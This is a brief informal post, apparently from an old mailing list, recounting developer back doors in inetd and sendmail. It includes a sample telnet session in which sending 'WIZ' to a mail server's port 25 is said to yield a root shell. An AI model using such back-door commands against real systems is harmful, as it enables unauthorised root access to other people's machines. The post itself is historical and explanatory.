The explaination I read about on the web was that inetd had a
developer's "back-door". If you knew about it, you could write
to inetd.conf, which had been opened r/w. Other back doors existed
in other network daemons also. The first exposed one was in
sendmail. You could do:
		telnet dumb.victum.com 25
		victum.com Sendmail 1.2.0 ready at Mon, Dec 4 1998

		WIZ
		220 Oh great leader.
		#
.... and you had a root-shell.
Cheers,
